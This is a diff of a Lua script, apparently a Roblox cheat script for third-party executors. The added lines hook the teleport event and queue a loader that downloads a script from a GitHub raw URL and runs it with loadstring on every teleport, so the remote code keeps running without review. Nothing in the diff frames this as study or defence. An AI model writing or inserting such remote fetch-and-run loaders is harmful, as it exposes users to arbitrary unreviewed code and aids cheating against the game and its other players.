@@ -1,3 +1,21 @@
+
+queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+local Players = game.Players
+local TeleportCheck = false
+Players.LocalPlayer.OnTeleport:Connect(function(State)
+	if (not TeleportCheck) and queueteleport then
+		TeleportCheck = true
+		 queue_on_teleport([[
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/MarvelousKing55209/universal-script-stuff/refs/heads/main/noname'))()
+     ]])
+	end
+end)
+
+wait(10)
+
+
+
+
 local magicName = tostring(game.Players.LocalPlayer.UserId).."Opened"
 
 local function findDiamondAttribute(object)
